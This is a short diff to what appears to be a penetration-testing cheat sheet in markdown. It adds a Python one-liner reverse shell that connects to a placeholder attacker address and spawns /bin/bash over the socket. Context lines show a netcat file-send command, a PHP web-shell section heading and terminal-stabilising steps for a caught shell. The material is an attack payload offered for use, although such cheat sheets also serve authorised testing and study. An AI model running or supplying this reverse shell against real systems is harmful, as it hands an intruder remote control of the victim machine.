@@ -30,6 +30,13 @@ nc <to_IP> <to_port> < file (SEND)
 ```
 <br>
 
+## Python (linux)
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_addr",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+<br>
 
 ## PHP simple shell
 ```
@@ -47,6 +54,6 @@ nc <to_IP> <to_port> < file (SEND)
   press ctrl+z key combination 
   (for zsh, one command): stty raw -echo; fg
   (for bash, two commands):
-  			   stty raw -echo
-			   fg
+        stty raw -echo
+        fg
 ```
